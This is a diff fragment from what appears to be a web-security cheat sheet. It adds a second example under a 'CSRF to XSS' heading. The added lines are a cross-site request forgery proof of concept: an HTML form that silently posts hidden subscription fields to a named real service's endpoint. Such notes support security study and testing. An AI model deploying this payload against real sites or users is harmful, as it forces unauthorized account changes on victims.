@@ -876,6 +876,21 @@ CSRF to XSS
     </form>
 </body>
 </html>
+
+Еще пример
+<!doctype html>
+<html>
+<head>
+</head> 
+<body>
+    <form action="https://www.instacart.com/v3/subscriptions" method="POST">
+        <input type="hidden" name="free_trial" id="free_trial" value="true">
+        <input type="hidden" name="promo" id="promo" value="true">
+        <input type="hidden" name="term" id="term" value="year">
+        <input type="submit">
+    </form>
+</body>
+</html>
 ```
 
 **SSRF - Server side request forgery**
